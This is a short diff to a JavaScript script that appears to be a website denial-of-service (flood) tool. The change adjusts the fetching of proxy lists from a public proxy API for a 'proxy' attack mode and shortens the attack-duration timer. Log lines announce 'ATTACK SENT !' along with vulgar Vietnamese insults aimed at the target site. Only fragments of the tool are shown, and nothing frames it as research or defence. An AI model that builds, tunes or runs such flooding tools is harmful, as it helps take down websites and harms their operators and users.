@@ -38,7 +38,7 @@ async function poptto() {
             console.log("ATTACK SENT ! DOWN CHẾT CON MẸ MÀY ĐI WEBSITE LỎ VCUT")
         } else if (process.argv[5] == 'proxy'){
             console.log("ATTACK SENT ! DOWN CHẾT CON MẸ MÀY ĐI WEBSITE LỎ VCUT")
-            const proxyscrape_http = await axios.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000000&country=all&ssl=all&anonymity=all');
+            const proxyscrape_http = await axios.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all');
             var proxies = proxyscrape_http.data.replace(/\r/g, '').split('\n');
         } else {
             console.log("ATTACK SENT ! TVT-SCRIPT")
@@ -104,7 +104,7 @@ async function poptto() {
         setTimeout(() => {
             console.log('Attack ended.');
             process.exit(0)
-        }, times * 100000000);
+        }, times * 100000);
     }
 }
 process.on('uncaughtException', function (err) {
